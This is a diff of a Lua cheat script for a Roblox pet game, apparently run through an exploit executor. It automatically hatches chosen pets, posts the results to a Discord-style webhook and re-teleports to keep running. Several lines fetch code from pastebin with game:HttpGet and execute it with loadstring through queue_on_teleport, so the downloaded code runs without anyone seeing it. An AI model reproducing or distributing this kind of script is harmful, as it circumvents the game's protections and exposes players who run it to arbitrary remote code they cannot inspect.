@@ -102,25 +102,32 @@ for uid, v in pairs(savedData.SavedObjects) do
         send_webhook(getgenv().webhook_url, petName, weight, chancePercent, pingUser)
     end
  
-    if isTargetPet(petName) then
-        local eggInstance = get_egg(uid)
-        if eggInstance then
+if isTargetPet(petName) then
+    local eggInstance = get_egg(uid)
+    if eggInstance then
+        pcall(function()
             replicated_storage.GameEvents.PetEggService:FireServer("HatchPet", eggInstance)
-            queue_on_teleport('loadstring(game:HttpGet("https://pastebin.com/phMPqnsw"))()')
-            task.wait(3)
-            teleport_service:Teleport(game.PlaceId)
-            foundTargetPet = true
-        end
+        end)
+        foundTargetPet = true
+        task.wait(0.5)
     end
- 
-if not foundTargetPet then
+end
+
+if foundTargetPet then
+    queue_on_teleport('loadstring(game:HttpGet("https://pastebin.com/phMPqnsw"))()')
+    task.wait(3)
+    teleport_service:Teleport(game.PlaceId)
+else
     local tpCD = string.format([[
         getgenv().webhook_url = %q
         getgenv().target_pets = %s
         getgenv().pingUser = %q
         loadstring(game:HttpGet("https://pastebin.com/raw/G7z8Lb1w"))()
     ]], getgenv().webhook_url or "", http_service:JSONEncode(getgenv().target_pets or {}), getgenv().pingUser or "")
- 
+
     queue_on_teleport(tpCD)
     teleport_service:Teleport(game.PlaceId)
 end
+
+--grant
+--source: uzu
